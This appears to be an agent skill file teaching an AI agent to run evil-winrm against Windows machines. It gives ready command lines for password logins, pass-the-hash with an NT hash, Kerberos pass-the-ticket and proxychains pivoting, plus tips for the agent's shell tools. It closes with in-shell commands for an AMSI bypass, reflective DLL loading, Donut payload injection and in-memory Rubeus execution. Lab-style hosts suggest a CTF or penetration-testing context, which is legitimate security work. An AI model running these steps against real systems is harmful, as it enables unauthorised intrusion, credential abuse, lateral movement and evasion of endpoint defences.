---
name: evil-winrm
description: "Interactive WinRM shell: Handles domain routing, non-interactive execution constraints, Pass-the-Hash, and path resolutions for Agent execution."
---

# evil-winrm

**Goal**: Execute commands and obtain interactive sessions on Windows machines over WinRM (Ports 5985 HTTP / 5986 HTTPS).

## Agent Constraints & Execution

When an AI Agent executes `evil-winrm`, standard PTY interactive prompts usually fail or capture nothing via piping (`echo whoami | evil-winrm`). Do not attempt to pipe into it if the session hangs.

Instead, when obtaining output programmatically through a shell:
1. Locate the absolute path of the gem (e.g., `gem contents evil-winrm`, or `find / -name "evil-winrm" -type f`).
2. Use an interactive shell controller, OR pass commands directly through single execution modes if supported.
3. If `evil-winrm` hangs or drops output, switch to Impacket's `wmiexec.py` or `psexec.py` as fallbacks for initial command execution. Caveat: those use NTLM — against **Kerberos-only or Protected Users** targets they fail; there, drive WinRM PSRP over Kerberos non-interactively (pypsrp `Client(...).execute_ps()`). See `offensive-techniques/active-directory-technique/references/lateral-movement-ad.md`.

## The Domain/Realm Trap
A common failure when attacking Active Directory via WinRM is attempting to pass the domain with the `-d` flag. **Modern versions of `evil-winrm` do not use `-d` for basic domain routing.**

- If you are NOT using Kerberos tickets, **do not pass a domain flag**. Simply pass `-u <user>` and `-p <password>`. WinRM will automatically negotiate the domain if the host is a Domain Controller or joined to it.
- If you ARE using Kerberos tickets (`-K`), you must specify the realm using `-r <realm>`. Note that Kerberos requires the FQDN to be passed to `-i` (e.g., `-i dc01.contoso.com`), not just the IP address, and the KDC must be configured in `/etc/krb5.conf`.

## Core Connection Patterns

```bash
# Basic connection (Let it negotiate Domain via NTLM auth inherently)
evil-winrm -i 10.129.20.206 -u 'alex.turner' -p 'Checkpoint2024!'

# Pass-The-Hash (NTLM, Format: NT or LM:NT)
evil-winrm -i 10.129.20.206 -u 'administrator' -H '8846f7eaee8fb117ad06bdd830b7586c'

# Kerberos Pass-The-Ticket (-K supports both ccache and kirbi)
# Note: IP must be the FQDN, and Realm must be specified
evil-winrm -i dc01.checkpoint.htb -r checkpoint.htb -K /tmp/ticket.ccache

# Over SSL (e.g., WinRM running on 5986 HTTPS)
evil-winrm -i 10.129.20.206 -u 'alex.turner' -p 'Checkpoint2024!' -S
```

## Proxychains / MCPwn Agent Gotchas

When running evil-winrm through `proxychains` (e.g. via a chisel SOCKS pivot):

- **Must be interactive**: `proxychains evil-winrm ...` needs a PTY. In MCPwn, use `start_interactive_shell`, not `execute_command`.
- **`run_in_shell` works for commands** but its completion-marker injection **breaks `download`/`upload`**: the marker string gets appended to the path argument, corrupting it. Use `send_to_shell` + `read_shell_output` for file transfers.
- **`download` path resolution**: evil-winrm resolves relative to CWD. Absolute paths in the argument get mangled (backslashes stripped). Fix: `cd` to the target directory first, then `download <filename> /local/dest`.
- **Non-interactive `-c` / single-command mode**: through proxychains it often SIGTERM's before output returns. Use the interactive shell approach instead.

## Built-In Menu Commands (Interactive Only)
Once a successful interactive shell is caught via PTY, use `menu` to see options:
- `upload /local/path [C:\remote\path]` (Remote path is optional, uses current dir)
- `download C:\remote\path [/local/path]`
- `Bypass-4MSI` (Attempts to patch AMSI in memory)
- `Dll-Loader -local -path C:\temp\pwn.dll` (Loads DLL reflectively in memory)
- `Donut-Loader -process_id [PID] -donutfile /tmp/payload.bin` (Injects x64 Donut payloads)
- `Invoke-Binary /path/to/Rubeus.exe 'param1, param2'` (Executes .NET assemblies directly from memory).
